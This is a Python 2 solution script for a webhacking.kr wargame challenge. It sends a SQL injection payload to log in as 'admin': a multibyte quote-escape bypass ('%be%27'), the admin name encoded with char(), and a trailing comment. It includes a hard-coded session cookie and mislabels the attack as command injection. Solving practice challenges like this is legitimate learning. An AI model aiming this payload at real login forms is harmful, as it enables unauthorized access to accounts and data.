#-*- coding: utf-8 -*-
import urllib2
import CookieManager

print "[+] Command Injection"

adminString = "char(" + ",".join("{:d}".format(ord(c)) for c in "admin") + ")"
challengeUrl = "http://webhacking.kr/challenge/web/web-22/index.php"
parameters = "?id=%be%27or%20id=" + adminString + "--%20&pw=bindon"
CookieManager.addCookie("PHPSESSID", "73ea5f35f558006f21f6185c171a2ed9")
httpRequest = urllib2.Request(challengeUrl + parameters)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
